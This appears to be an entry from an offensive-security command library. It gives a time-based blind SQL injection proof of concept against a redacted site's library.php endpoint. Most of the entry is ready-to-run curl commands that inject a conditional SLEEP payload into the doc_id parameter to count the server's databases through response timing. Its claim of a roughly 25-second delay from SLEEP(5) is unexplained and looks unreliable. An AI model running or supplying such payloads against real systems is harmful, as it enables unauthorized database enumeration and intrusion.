---
data: >-
  curl -X GET "https://████/library.php?path=test&doc_id=1 AND (IF((SELECT
  COUNT(*) FROM information_schema.schemata)=3, SLEEP(5), 0))" --max-time 30 -w
  "%{time_total}\n" -s -o /dev/null
tags:
  - enumeration
  - sqli
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.219Z'
id: d6fc0386-0106-4cb6-89fb-7df19eb75f6f
verified: false
validated: true
submitted: true
---
# database-enumeration-poc

## Command

```bash
curl -X GET "https://████/library.php?path=test&doc_id=1 AND (IF((SELECT COUNT(*) FROM information_schema.schemata)=3, SLEEP(5), 0))" --max-time 30 -w "%{time_total}\n" -s -o /dev/null
```

## Description

Performs a POC enumeration of database count using conditional SLEEP in blind SQLi.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Condition | =3 in COUNT query | Yes (adjust for target) |
| SLEEP(5) | Delay value for true condition | Yes |
| --max-time | Prevent indefinite wait | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://████/library.php?path=test&doc_id=1 AND (IF((SELECT COUNT(*) FROM information_schema.schemata)=3, SLEEP(5), 0))" --max-time 30 -w "%{time_total}\n" -s -o /dev/null
```

### Advanced Usage

```bash
curl -X GET "https://████/library.php?path=test&doc_id=1 AND (IF((SELECT COUNT(*) FROM information_schema.schemata)=4, SLEEP(5), 0))" --max-time 10 -w "%{time_total}\n" -s -o /dev/null
```

## Expected Output

Total time ~25s (5x multiplier) if count=3, quick response otherwise.

## Related

- [[procedures/Enumerate-Database-Count-via-Blind-SQLi]]
